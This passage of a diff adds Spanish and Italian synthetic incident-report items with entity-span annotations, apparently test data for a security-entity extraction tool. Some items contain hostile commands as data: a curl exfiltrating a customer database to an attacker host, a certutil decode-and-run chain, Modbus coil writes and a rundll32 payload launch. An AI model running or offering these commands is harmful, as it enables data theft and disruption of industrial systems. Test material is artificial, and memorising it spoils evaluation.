+          "entity_type": "PORT_NUMBER",
+          "text": "cuatrocientos cuarenta y tres"
+        },
+        {
+          "start": 247,
+          "end": 260,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "WEB-DMZ-BCN01"
+        },
+        {
+          "start": 275,
+          "end": 290,
+          "entity_type": "ORGANIZATION",
+          "text": "TelcoNet España"
+        },
+        {
+          "start": 318,
+          "end": 324,
+          "entity_type": "CWE",
+          "text": "CWE-79"
+        },
+        {
+          "start": 327,
+          "end": 334,
+          "entity_type": "CWE",
+          "text": "CWE-352"
+        },
+        {
+          "start": 389,
+          "end": 393,
+          "entity_type": "THREAT_GROUP",
+          "text": "FIN7"
+        },
+        {
+          "start": 432,
+          "end": 445,
+          "entity_type": "CVE",
+          "text": "CVE-2025-8888"
+        },
+        {
+          "start": 471,
+          "end": 479,
+          "entity_type": "MALWARE",
+          "text": "Carbanak"
+        },
+        {
+          "start": 517,
+          "end": 549,
+          "entity_type": "HASH_FILE",
+          "text": "098f6bcd4621d373cade4e832627b4f6"
+        },
+        {
+          "start": 566,
+          "end": 588,
+          "entity_type": "DATE_TIME",
+          "text": "el diecisiete de marzo"
+        }
+      ]
+    },
+    {
+      "id": "cyber_042",
+      "description": "ES SCADA industrial con IBAN, Modbus, MITRE ICS, commande Python",
+      "text": "Miren, les voy a contar lo que descubrimos en la auditoría del sistema SCADA de la central eléctrica. El día veintiocho de febrero de dos mil veinticinco, a eso de las tres y cuarto de la madrugada, el operador nocturno Alejandro Ruiz Navarro detectó actividad inusual en el controlador PLC-CENTRAL-04. Alguien desde la dirección 95.142.46.22 había establecido una conexión TCP en el puerto quinientos dos. El grupo de amenazas Sandworm Team había desplegado el malware Industroyer2 utilizando la técnica T0855 específica de sistemas industriales. Se ejecutó el comando python3 -c import modbus_tk; modbus_tk.write_coils(1,0,100) para manipular los controladores. El incidente fue registrado como ICS-2025-0042 y la IBAN de la cuenta donde se solicitó el rescate era ES9121000418450200051332.",
+      "ground_truth": [
+        {
+          "start": 109,
+          "end": 153,
+          "entity_type": "DATE_TIME",
+          "text": "veintiocho de febrero de dos mil veinticinco"
+        },
+        {
+          "start": 164,
+          "end": 197,
+          "entity_type": "DATE_TIME",
+          "text": "las tres y cuarto de la madrugada"
+        },
+        {
+          "start": 220,
+          "end": 242,
+          "entity_type": "PERSON",
+          "text": "Alejandro Ruiz Navarro"
+        },
+        {
+          "start": 287,
+          "end": 301,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "PLC-CENTRAL-04"
+        },
+        {
+          "start": 330,
+          "end": 342,
+          "entity_type": "IP_ADDRESS",
+          "text": "95.142.46.22"
+        },
+        {
+          "start": 374,
+          "end": 377,
+          "entity_type": "PROTOCOL",
+          "text": "TCP"
+        },
+        {
+          "start": 391,
+          "end": 405,
+          "entity_type": "PORT_NUMBER",
+          "text": "quinientos dos"
+        },
+        {
+          "start": 428,
+          "end": 441,
+          "entity_type": "THREAT_GROUP",
+          "text": "Sandworm Team"
+        },
+        {
+          "start": 470,
+          "end": 482,
+          "entity_type": "MALWARE",
+          "text": "Industroyer2"
+        },
+        {
+          "start": 505,
+          "end": 510,
+          "entity_type": "MITRE_TECHNIQUE",
+          "text": "T0855"
+        },
+        {
+          "start": 570,
+          "end": 629,
+          "entity_type": "COMMAND",
+          "text": "python3 -c import modbus_tk; modbus_tk.write_coils(1,0,100)"
+        },
+        {
+          "start": 697,
+          "end": 710,
+          "entity_type": "INCIDENT_ID",
+          "text": "ICS-2025-0042"
+        },
+        {
+          "start": 767,
+          "end": 791,
+          "entity_type": "IBAN_CODE",
+          "text": "ES9121000418450200051332"
+        }
+      ]
+    },
+    {
+      "id": "cyber_043",
+      "description": "ES adversarial - empresa Portón Grande, IBAN alemán, ransomware",
+      "text": "El servidor de la empresa Portón Grande, que nada tiene que ver con puertas ni puertos de red, fue atacado el once de marzo. El nombre del servidor comprometido es APP-PORTON-01 y el ataque se realizó a través del puerto tres mil trescientos ochenta y nueve utilizando el protocolo RDP. La analista de seguridad Patricia Guerrero detectó el ransomware BlackBasta comunicándose con 185.143.223.11. El IBAN utilizado para el pago del rescate era DE89370400440532013000 por un monto de cincuenta mil euros.",
+      "ground_truth": [
+        {
+          "start": 26,
+          "end": 39,
+          "entity_type": "ORGANIZATION",
+          "text": "Portón Grande"
+        },
+        {
+          "start": 107,
+          "end": 123,
+          "entity_type": "DATE_TIME",
+          "text": "el once de marzo"
+        },
+        {
+          "start": 164,
+          "end": 177,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "APP-PORTON-01"
+        },
+        {
+          "start": 221,
+          "end": 257,
+          "entity_type": "PORT_NUMBER",
+          "text": "tres mil trescientos ochenta y nueve"
+        },
+        {
+          "start": 282,
+          "end": 285,
+          "entity_type": "PROTOCOL",
+          "text": "RDP"
+        },
+        {
+          "start": 312,
+          "end": 329,
+          "entity_type": "PERSON",
+          "text": "Patricia Guerrero"
+        },
+        {
+          "start": 352,
+          "end": 362,
+          "entity_type": "RANSOMWARE",
+          "text": "BlackBasta"
+        },
+        {
+          "start": 381,
+          "end": 395,
+          "entity_type": "IP_ADDRESS",
+          "text": "185.143.223.11"
+        },
+        {
+          "start": 444,
+          "end": 466,
+          "entity_type": "IBAN_CODE",
+          "text": "DE89370400440532013000"
+        }
+      ]
+    },
+    {
+      "id": "cyber_044",
+      "description": "ES narrativa muy larga con DNS tunneling, PlugX, doble aparición de proceso",
+      "text": "Les cuento algo que me dejó perplejo. Resulta que llevábamos meses investigando al grupo de amenazas persistentes conocido como Mustang Panda, y finalmente conseguimos rastrear sus operaciones hasta un servidor de comando y control ubicado en 103.56.115.77. Lo curioso del asunto es que utilizaban el puerto quinientos cincuenta y tres, que normalmente se asocia con DNS sobre TLS, pero en realidad estaban tunelizando tráfico HTTP estándar. Nuestra investigadora principal, la doctora Elena Vásquez de la Cruz, descubrió que el malware PlugX se comunicaba mediante el proceso legítimo rundll32.exe ejecutando la orden rundll32.exe shell32.dll,Control_RunDLL payload.cpl cada vez que se reiniciaba el equipo WORKSTATION-ES42. Todo esto ocurrió entre el primero y el quinto de marzo de dos mil veinticinco. El hash SHA1 del payload era da39a3ee5e6b4b0d3255bfef95601890afd80709 y la vulnerabilidad explotada fue CVE-2025-3333.",
+      "ground_truth": [
+        {
+          "start": 128,
+          "end": 141,
+          "entity_type": "THREAT_GROUP",
+          "text": "Mustang Panda"
+        },
+        {
+          "start": 243,
+          "end": 256,
+          "entity_type": "IP_ADDRESS",
+          "text": "103.56.115.77"
+        },
+        {
+          "start": 308,
+          "end": 335,
+          "entity_type": "PORT_NUMBER",
+          "text": "quinientos cincuenta y tres"
+        },
+        {
+          "start": 427,
+          "end": 431,
+          "entity_type": "PROTOCOL",
+          "text": "HTTP"
+        },
+        {
+          "start": 486,
+          "end": 510,
+          "entity_type": "PERSON",
+          "text": "Elena Vásquez de la Cruz"
+        },
+        {
+          "start": 537,
+          "end": 542,
+          "entity_type": "MALWARE",
+          "text": "PlugX"
+        },
+        {
+          "start": 586,
+          "end": 598,
+          "entity_type": "PROCESS_NAME",
+          "text": "rundll32.exe"
+        },
+        {
+          "start": 619,
+          "end": 670,
+          "entity_type": "COMMAND",
+          "text": "rundll32.exe shell32.dll,Control_RunDLL payload.cpl"
+        },
+        {
+          "start": 708,
+          "end": 724,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "WORKSTATION-ES42"
+        },
+        {
+          "start": 744,
+          "end": 804,
+          "entity_type": "DATE_TIME",
+          "text": "entre el primero y el quinto de marzo de dos mil veinticinco"
+        },
+        {
+          "start": 835,
+          "end": 875,
+          "entity_type": "HASH_FILE",
+          "text": "da39a3ee5e6b4b0d3255bfef95601890afd80709"
+        },
+        {
+          "start": 910,
+          "end": 923,
+          "entity_type": "CVE",
+          "text": "CVE-2025-3333"
+        }
+      ]
+    },
+    {
+      "id": "cyber_045",
+      "description": "ES adversarial extremo - empresa Ocho Ochenta, calle Servidor, apellido Servidor",
+      "text": "No todo lo que parece un indicador de compromiso lo es realmente. Por ejemplo, la empresa Ocho Ochenta S.L. no tiene relación con el puerto ocho mil ochenta que fue comprometido. Del mismo modo, la calle Servidor número ciento veinte donde se ubica nuestra oficina no es un servidor interno. El verdadero servidor afectado es CITRIX-GW-MAD01, que fue comprometido el trece de marzo mediante CVE-2025-7654 por el actor de amenazas Evil Corp. El ataque se originó desde 62.210.180.52 y el analista Fernando de la Calle Servidor, cuyo apellido es pura coincidencia, documentó todo en el ticket INC-2025-0777.",
+      "ground_truth": [
+        {
+          "start": 90,
+          "end": 107,
+          "entity_type": "ORGANIZATION",
+          "text": "Ocho Ochenta S.L."
+        },
+        {
+          "start": 140,
+          "end": 156,
+          "entity_type": "PORT_NUMBER",
+          "text": "ocho mil ochenta"
+        },
+        {
+          "start": 326,
+          "end": 341,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "CITRIX-GW-MAD01"
+        },
+        {
+          "start": 364,
+          "end": 381,
+          "entity_type": "DATE_TIME",
+          "text": "el trece de marzo"
+        },
+        {
+          "start": 391,
+          "end": 404,
+          "entity_type": "CVE",
+          "text": "CVE-2025-7654"
+        },
+        {
+          "start": 430,
+          "end": 439,
+          "entity_type": "THREAT_GROUP",
+          "text": "Evil Corp"
+        },
+        {
+          "start": 468,
+          "end": 481,
+          "entity_type": "IP_ADDRESS",
+          "text": "62.210.180.52"
+        },
+        {
+          "start": 496,
+          "end": 525,
+          "entity_type": "PERSON",
+          "text": "Fernando de la Calle Servidor"
+        },
+        {
+          "start": 591,
+          "end": 604,
+          "entity_type": "INCIDENT_ID",
+          "text": "INC-2025-0777"
+        }
+      ]
+    },
+    {
+      "id": "cyber_046",
+      "description": "ES informe final complejo con IBAN italiano, ShadowPad, multiples entidades",
+      "text": "El informe final del incidente es extenso pero intentaré resumirlo. La empresa Telecomunicaciones del Puerto de Valencia sufrió un ataque coordinado que comenzó el seis de enero de dos mil veinticinco. El grupo APT41 aprovechó dos vulnerabilidades encadenadas, CVE-2025-0101 y CVE-2025-0102, para penetrar el perímetro defensivo. Primero comprometieron el servidor de correo SMTP-RELAY-VLC01 y luego pivotaron al controlador de dominio AD-MASTER-VLC. El usuario comprometido fue it_admin con la contraseña Valencia2025!Sol. El malware ShadowPad fue desplegado mediante el proceso legítimo wmiprvse.exe y estableció comunicación con https://cdn-updates.shadow-c2.com/sync a través del puerto cuatrocientos cuarenta y tres. La técnica MITRE utilizada fue T1021.006 para el movimiento lateral. El hash del implante es 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8 y el IBAN donde se solicitó el rescate fue IT60X0542811101000000123456. Para consultas contactar a investigador.jefe@cert-valencia.es o al +34-96-555-1234.",
+      "ground_truth": [
+        {
+          "start": 79,
+          "end": 120,
+          "entity_type": "ORGANIZATION",
+          "text": "Telecomunicaciones del Puerto de Valencia"
+        },
+        {
+          "start": 161,
+          "end": 200,
+          "entity_type": "DATE_TIME",
+          "text": "el seis de enero de dos mil veinticinco"
+        },
+        {
+          "start": 211,
+          "end": 216,
+          "entity_type": "THREAT_GROUP",
+          "text": "APT41"
+        },
+        {
+          "start": 261,
+          "end": 274,
+          "entity_type": "CVE",
+          "text": "CVE-2025-0101"
+        },
+        {
+          "start": 277,
+          "end": 290,
+          "entity_type": "CVE",
+          "text": "CVE-2025-0102"
+        },
+        {
+          "start": 375,
+          "end": 391,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "SMTP-RELAY-VLC01"
+        },
+        {
+          "start": 436,
+          "end": 449,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "AD-MASTER-VLC"
+        },
+        {
+          "start": 479,
+          "end": 487,
+          "entity_type": "USERNAME",
+          "text": "it_admin"
+        },
+        {
+          "start": 506,
+          "end": 522,
+          "entity_type": "PASSWORD",
+          "text": "Valencia2025!Sol"
+        },
+        {
+          "start": 535,
+          "end": 544,
+          "entity_type": "MALWARE",
+          "text": "ShadowPad"
+        },
+        {
+          "start": 589,
+          "end": 601,
+          "entity_type": "PROCESS_NAME",
+          "text": "wmiprvse.exe"
+        },
+        {
+          "start": 632,
+          "end": 670,
+          "entity_type": "URL",
+          "text": "https://cdn-updates.shadow-c2.com/sync"
+        },
+        {
+          "start": 691,
+          "end": 720,
+          "entity_type": "PORT_NUMBER",
+          "text": "cuatrocientos cuarenta y tres"
+        },
+        {
+          "start": 753,
+          "end": 762,
+          "entity_type": "MITRE_TECHNIQUE",
+          "text": "T1021.006"
+        },
+        {
+          "start": 815,
+          "end": 879,
+          "entity_type": "HASH_FILE",
+          "text": "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"
+        },
+        {
+          "start": 923,
+          "end": 950,
+          "entity_type": "IBAN_CODE",
+          "text": "IT60X0542811101000000123456"
+        },
+        {
+          "start": 979,
+          "end": 1013,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "investigador.jefe@cert-valencia.es"
+        },
+        {
+          "start": 1019,
+          "end": 1034,
+          "entity_type": "PHONE_NUMBER",
+          "text": "+34-96-555-1234"
+        }
+      ]
+    },
+    {
+      "id": "cyber_047",
+      "description": "IT rapporto base con data e porta in lettere",
+      "text": "Il rapporto di sicurezza redatto dall'analista Luca Bianchi il dieci marzo duemilaventicinque descrive un attacco al server POSTA-SRV-MI01 della società Finanza Digitale. L'attaccante ha sfruttato la vulnerabilità CVE-2025-2222 per accedere tramite il protocollo SSH sulla porta ventidue. L'indirizzo IP di origine era 178.33.44.55.",
+      "ground_truth": [
+        {
+          "start": 47,
+          "end": 59,
+          "entity_type": "PERSON",
+          "text": "Luca Bianchi"
+        },
+        {
+          "start": 60,
+          "end": 93,
+          "entity_type": "DATE_TIME",
+          "text": "il dieci marzo duemilaventicinque"
+        },
+        {
+          "start": 124,
+          "end": 138,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "POSTA-SRV-MI01"
+        },
+        {
+          "start": 153,
+          "end": 169,
+          "entity_type": "ORGANIZATION",
+          "text": "Finanza Digitale"
+        },
+        {
+          "start": 214,
+          "end": 227,
+          "entity_type": "CVE",
+          "text": "CVE-2025-2222"
+        },
+        {
+          "start": 263,
+          "end": 266,
+          "entity_type": "PROTOCOL",
+          "text": "SSH"
+        },
+        {
+          "start": 279,
+          "end": 287,
+          "entity_type": "PORT_NUMBER",
+          "text": "ventidue"
+        },
+        {
+          "start": 319,
+          "end": 331,
+          "entity_type": "IP_ADDRESS",
+          "text": "178.33.44.55"
+        }
+      ]
+    },
+    {
+      "id": "cyber_048",
+      "description": "IT analisi malware con hash SHA256, processo e data in lettere",
+      "text": "L'unità di risposta agli incidenti ha identificato il malware QakBot sul server di file sharing FS-CONDIVISO-02. Il processo malware.exe è stato trovato a comunicare con il centro di comando e controllo all'indirizzo https://c2.qakbot-infra.net/panel ogni quindici minuti. L'hash SHA256 del campione è 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b. L'incidente, catalogato come CERT-IT-2025-0189, è stato gestito dalla dottoressa Francesca Moretti che ha informato il team il sedici marzo alle ore diciassette e trenta.",
+      "ground_truth": [
+        {
+          "start": 62,
+          "end": 68,
+          "entity_type": "MALWARE",
+          "text": "QakBot"
+        },
+        {
+          "start": 96,
+          "end": 111,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "FS-CONDIVISO-02"
+        },
+        {
+          "start": 125,
+          "end": 136,
+          "entity_type": "PROCESS_NAME",
+          "text": "malware.exe"
+        },
+        {
+          "start": 217,
+          "end": 250,
+          "entity_type": "URL",
+          "text": "https://c2.qakbot-infra.net/panel"
+        },
+        {
+          "start": 302,
+          "end": 366,
+          "entity_type": "HASH_FILE",
+          "text": "6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b"
+        },
+        {
+          "start": 397,
+          "end": 414,
+          "entity_type": "INCIDENT_ID",
+          "text": "CERT-IT-2025-0189"
+        },
+        {
+          "start": 449,
+          "end": 466,
+          "entity_type": "PERSON",
+          "text": "Francesca Moretti"
+        },
+        {
+          "start": 492,
+          "end": 537,
+          "entity_type": "DATE_TIME",
+          "text": "il sedici marzo alle ore diciassette e trenta"
+        }
+      ]
+    },
+    {
+      "id": "cyber_049",
+      "description": "IT campagna phishing con Kimsuky, MITRE e multipli contatti",
+      "text": "La campagna di phishing ha preso di mira i dipendenti del Gruppo Assicurativo Trieste. Le email fraudolente provenivano dall'indirizzo supporto@assicurazioni-trieste.xyz e contenevano un link a https://assicurazioni-trieste.xyz/accesso. La tecnica MITRE T1566.001 è stata utilizzata dal gruppo di minacce Kimsuky per raccogliere credenziali. L'analista Paolo Rinaldi ha segnalato l'attacco il ventitre febbraio contattando il CSIRT all'indirizzo csirt@sicurezza-it.gov.it e al numero +39-06-4991-2345.",
+      "ground_truth": [
+        {
+          "start": 58,
+          "end": 85,
+          "entity_type": "ORGANIZATION",
+          "text": "Gruppo Assicurativo Trieste"
+        },
+        {
+          "start": 135,
+          "end": 169,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "supporto@assicurazioni-trieste.xyz"
+        },
+        {
+          "start": 194,
+          "end": 235,
+          "entity_type": "URL",
+          "text": "https://assicurazioni-trieste.xyz/accesso"
+        },
+        {
+          "start": 254,
+          "end": 263,
+          "entity_type": "MITRE_TECHNIQUE",
+          "text": "T1566.001"
+        },
+        {
+          "start": 305,
+          "end": 312,
+          "entity_type": "THREAT_GROUP",
+          "text": "Kimsuky"
+        },
+        {
+          "start": 353,
+          "end": 366,
+          "entity_type": "PERSON",
+          "text": "Paolo Rinaldi"
+        },
+        {
+          "start": 390,
+          "end": 410,
+          "entity_type": "DATE_TIME",
+          "text": "il ventitre febbraio"
+        },
+        {
+          "start": 446,
+          "end": 471,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "csirt@sicurezza-it.gov.it"
+        },
+        {
+          "start": 484,
+          "end": 500,
+          "entity_type": "PHONE_NUMBER",
+          "text": "+39-06-4991-2345"
+        }
+      ]
+    },
+    {
+      "id": "cyber_050",
+      "description": "IT adversarial - persona cognome Porta, porta in lettere, CWE",
+      "text": "Vi racconto una cosa assurda che è successa la settimana scorsa. Il nostro amministratore di sistema, Giovanni Porta, il cui cognome non ha nulla a che fare con le porte di rete, ha scoperto che qualcuno stava usando la porta quattromilaquattrocento per comunicare con un server esterno. L'attaccante, identificato come appartenente al gruppo Gamaredon, aveva compromesso il server di dominio AD-DC-ROMA02 sfruttando la vulnerabilità CWE-798 relativa a credenziali hardcoded. Il nome utente compromesso era svc_backup con la password InvernoPiovoso2025! che era letteralmente scritta in un file di configurazione. Il malware Pterodo comunicava con 185.158.114.77 utilizzando il protocollo HTTPS. Il tutto è stato scoperto il dodici marzo duemilaventicinque.",
+      "ground_truth": [
+        {
+          "start": 102,
+          "end": 116,
+          "entity_type": "PERSON",
+          "text": "Giovanni Porta"
+        },
+        {
+          "start": 226,
+          "end": 249,
+          "entity_type": "PORT_NUMBER",
+          "text": "quattromilaquattrocento"
+        },
+        {
+          "start": 343,
+          "end": 352,
+          "entity_type": "THREAT_GROUP",
+          "text": "Gamaredon"
+        },
+        {
+          "start": 393,
+          "end": 405,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "AD-DC-ROMA02"
+        },
+        {
+          "start": 434,
+          "end": 441,
+          "entity_type": "CWE",
+          "text": "CWE-798"
+        },
+        {
+          "start": 507,
+          "end": 517,
+          "entity_type": "USERNAME",
+          "text": "svc_backup"
+        },
+        {
+          "start": 534,
+          "end": 553,
+          "entity_type": "PASSWORD",
+          "text": "InvernoPiovoso2025!"
+        },
+        {
+          "start": 625,
+          "end": 632,
+          "entity_type": "MALWARE",
+          "text": "Pterodo"
+        },
+        {
+          "start": 648,
+          "end": 662,
+          "entity_type": "IP_ADDRESS",
+          "text": "185.158.114.77"
+        },
+        {
+          "start": 689,
+          "end": 694,
+          "entity_type": "PROTOCOL",
+          "text": "HTTPS"
+        },
+        {
+          "start": 722,
+          "end": 756,
+          "entity_type": "DATE_TIME",
+          "text": "il dodici marzo duemilaventicinque"
+        }
+      ]
+    },
+    {
+      "id": "cyber_051",
+      "description": "IT indagine forense con TA505, comando certutil, porta in lettere",
+      "text": "L'indagine forense condotta dal team di sicurezza di Energia Italia ha rivelato un attacco particolarmente sofisticato. Il vettore iniziale è stato un documento Word infetto inviato all'indirizzo email ingegnere.capo@energia-italia.it il primo marzo. Il malware Ursnif, nascosto nel processo regsvr32.exe, ha stabilito una connessione con il server di comando https://update.fake-microsoft.xyz/office via TCP sulla porta quattrocentoquarantatre. L'attaccante ha poi eseguito il comando certutil -decode payload.b64 payload.exe && payload.exe per attivare il secondo stadio dell'attacco. Il gruppo responsabile è stato identificato come TA505 e la vulnerabilità sfruttata era CVE-2025-4444. L'hash del documento originale è 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824.",
+      "ground_truth": [
+        {
+          "start": 53,
+          "end": 67,
+          "entity_type": "ORGANIZATION",
+          "text": "Energia Italia"
+        },
+        {
+          "start": 202,
+          "end": 234,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "ingegnere.capo@energia-italia.it"
+        },
+        {
+          "start": 235,
+          "end": 249,
+          "entity_type": "DATE_TIME",
+          "text": "il primo marzo"
+        },
+        {
+          "start": 262,
+          "end": 268,
+          "entity_type": "MALWARE",
+          "text": "Ursnif"
+        },
+        {
+          "start": 292,
+          "end": 304,
+          "entity_type": "PROCESS_NAME",
+          "text": "regsvr32.exe"
+        },
+        {
+          "start": 360,
+          "end": 400,
+          "entity_type": "URL",
+          "text": "https://update.fake-microsoft.xyz/office"
+        },
+        {
+          "start": 405,
+          "end": 408,
+          "entity_type": "PROTOCOL",
+          "text": "TCP"
+        },
+        {
+          "start": 421,
+          "end": 444,
+          "entity_type": "PORT_NUMBER",
+          "text": "quattrocentoquarantatre"
+        },
+        {
+          "start": 486,
+          "end": 541,
+          "entity_type": "COMMAND",
+          "text": "certutil -decode payload.b64 payload.exe && payload.exe"
+        },
+        {
+          "start": 636,
+          "end": 641,
+          "entity_type": "THREAT_GROUP",
+          "text": "TA505"
+        },
+        {
+          "start": 675,
+          "end": 688,
+          "entity_type": "CVE",
+          "text": "CVE-2025-4444"
+        },
+        {
+          "start": 723,
+          "end": 787,
+          "entity_type": "HASH_FILE",
+          "text": "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824"
+        }
+      ]
+    },
+    {
+      "id": "cyber_052",
+      "description": "IT adversarial - Porto Sicuro S.r.l., Marco Server, IBAN svizzero",
+      "text": "Il caso più bizzarro della mia carriera riguarda la società Porto Sicuro S.r.l. di Milano, il cui nome non ha alcuna relazione con porte TCP o sicurezza informatica. Il quindici marzo duemilaventicinque, l'impiegato Marco Server, un cognome davvero sfortunato per chi lavora nell'IT, ha segnalato che il server GESTIONALE-SRV-01 risultava irraggiungibile. L'investigazione ha rivelato che il ransomware Akira aveva cifrato tutti i dati. Il riscatto di centomila euro doveva essere pagato all'IBAN CH9300762011623852957 in Bitcoin. L'attacco proveniva dall'IP 91.92.109.87 sulla porta tremila trecentotrentasette e sfruttava la tecnica MITRE T1486 per l'impatto sui dati.",
+      "ground_truth": [
+        {
+          "start": 60,
+          "end": 79,
+          "entity_type": "ORGANIZATION",
+          "text": "Porto Sicuro S.r.l."
+        },
+        {
+          "start": 166,
+          "end": 202,
+          "entity_type": "DATE_TIME",
+          "text": "Il quindici marzo duemilaventicinque"
+        },
+        {
+          "start": 216,
+          "end": 228,
+          "entity_type": "PERSON",
+          "text": "Marco Server"
+        },
+        {
+          "start": 311,
+          "end": 328,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "GESTIONALE-SRV-01"
+        },
+        {
+          "start": 403,
+          "end": 408,
+          "entity_type": "RANSOMWARE",
+          "text": "Akira"
+        },
+        {
+          "start": 497,
+          "end": 518,
+          "entity_type": "IBAN_CODE",
+          "text": "CH9300762011623852957"
+        },
+        {
+          "start": 559,
+          "end": 571,
+          "entity_type": "IP_ADDRESS",
+          "text": "91.92.109.87"
+        },
+        {
+          "start": 584,
+          "end": 611,
+          "entity_type": "PORT_NUMBER",
+          "text": "tremila trecentotrentasette"
+        },
+        {
+          "start": 641,
+          "end": 646,
+          "entity_type": "MITRE_TECHNIQUE",
+          "text": "T1486"
+        }
+      ]
+    },
+    {
+      "id": "cyber_053",
+      "description": "IT narrativa lunga con Cobalt Strike, APT32, multiples serveurs, contatti",
+      "text": "Permettetemi di ricostruire la sequenza degli eventi. Tutto è cominciato il ventisette gennaio duemilaventicinque quando l'analista senior Alessandra De Luca ha notato anomalie nel traffico di rete del nostro data center principale. Il server applicativo API-GATEWAY-MI03 stava generando un volume insolito di richieste verso l'esterno. Analizzando i log, Alessandra ha scoperto che il processo java.exe stava eseguendo il comando curl -X POST https://exfil.darkweb.onion/upload -d @/opt/data/clienti.db ogni trenta minuti esatti. Il malware responsabile, identificato come una variante di Cobalt Strike, era stato impiantato dal gruppo di minacce APT32 attraverso la vulnerabilità CVE-2025-6666 nel nostro gateway VPN VPN-EDGE-01. La comunicazione avveniva su protocollo HTTPS sulla porta quattrocentoquarantatre e l'hash del beacon era 3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1. Per il monitoraggio continuo, contattare a.deluca@cybersec-italia.com o il numero +39-02-8765-4321.",
+      "ground_truth": [
+        {
+          "start": 73,
+          "end": 113,
+          "entity_type": "DATE_TIME",
+          "text": "il ventisette gennaio duemilaventicinque"
+        },
+        {
+          "start": 139,
+          "end": 157,
+          "entity_type": "PERSON",
+          "text": "Alessandra De Luca"
+        },
+        {
+          "start": 255,
+          "end": 271,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "API-GATEWAY-MI03"
+        },
+        {
+          "start": 395,
+          "end": 403,
+          "entity_type": "PROCESS_NAME",
+          "text": "java.exe"
+        },
+        {
+          "start": 431,
+          "end": 503,
+          "entity_type": "COMMAND",
+          "text": "curl -X POST https://exfil.darkweb.onion/upload -d @/opt/data/clienti.db"
+        },
+        {
+          "start": 590,
+          "end": 603,
+          "entity_type": "MALWARE",
+          "text": "Cobalt Strike"
+        },
+        {
+          "start": 648,
+          "end": 653,
+          "entity_type": "THREAT_GROUP",
+          "text": "APT32"
+        },
+        {
+          "start": 682,
+          "end": 695,
+          "entity_type": "CVE",
+          "text": "CVE-2025-6666"
+        },
+        {
+          "start": 719,
+          "end": 730,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "VPN-EDGE-01"
+        },
+        {
+          "start": 772,
+          "end": 777,
+          "entity_type": "PROTOCOL",
+          "text": "HTTPS"
+        },
+        {
+          "start": 790,
+          "end": 813,
+          "entity_type": "PORT_NUMBER",
+          "text": "quattrocentoquarantatre"
+        },
+        {
+          "start": 838,
+          "end": 902,
+          "entity_type": "HASH_FILE",
+          "text": "3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1"
+        },
+        {
+          "start": 945,
+          "end": 973,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "a.deluca@cybersec-italia.com"
+        },
+        {
+          "start": 986,
+          "end": 1002,
+          "entity_type": "PHONE_NUMBER",
+          "text": "+39-02-8765-4321"
+        }
+      ]
+    },
+    {
+      "id": "cyber_054",
+      "description": "IT falsi positivi - milleduecentro allarmi, IcedID, MITRE process injection",
+      "text": "Il nostro sistema di prevenzione intrusioni ha generato milleduecento allarmi nelle ultime ventiquattro ore, ma solo tre erano veri positivi. Il primo riguardava una connessione sospetta dal server MONITORING-SRV-05 verso 172.104.210.33 sulla porta novemilaottantuno. Il secondo era relativo al malware IcedID trovato sul computer dell'utente r.colombo che aveva visitato il sito https://aggiornamento-flash.xyz/install. Il terzo allarme segnalava l'utilizzo della tecnica T1055.012 di process injection sul server CITRIX-VDI-02. L'analista Roberto Colombo ha confermato i risultati il diciotto marzo.",
+      "ground_truth": [
+        {
+          "start": 198,
+          "end": 215,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "MONITORING-SRV-05"
+        },
+        {
+          "start": 222,
+          "end": 236,
+          "entity_type": "IP_ADDRESS",
+          "text": "172.104.210.33"
+        },
+        {
+          "start": 249,
+          "end": 266,
+          "entity_type": "PORT_NUMBER",
+          "text": "novemilaottantuno"
+        },
+        {
+          "start": 303,
+          "end": 309,
+          "entity_type": "MALWARE",
+          "text": "IcedID"
+        },
+        {
+          "start": 343,
+          "end": 352,
+          "entity_type": "USERNAME",
+          "text": "r.colombo"
+        },
+        {
+          "start": 380,
+          "end": 419,
+          "entity_type": "URL",
+          "text": "https://aggiornamento-flash.xyz/install"
+        },
+        {
+          "start": 473,
+          "end": 482,
+          "entity_type": "MITRE_TECHNIQUE",
+          "text": "T1055.012"
+        },
+        {
+          "start": 515,
+          "end": 528,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "CITRIX-VDI-02"
+        },
+        {
+          "start": 541,
+          "end": 556,
+          "entity_type": "PERSON",
+          "text": "Roberto Colombo"
+        },
+        {
+          "start": 583,
+          "end": 600,
+          "entity_type": "DATE_TIME",
+          "text": "il diciotto marzo"
+        }
+      ]
+    },
+    {
+      "id": "cyber_055",
+      "description": "IT adversarial - Banca Popolare di Cyber, Antonio Maria Firewall",
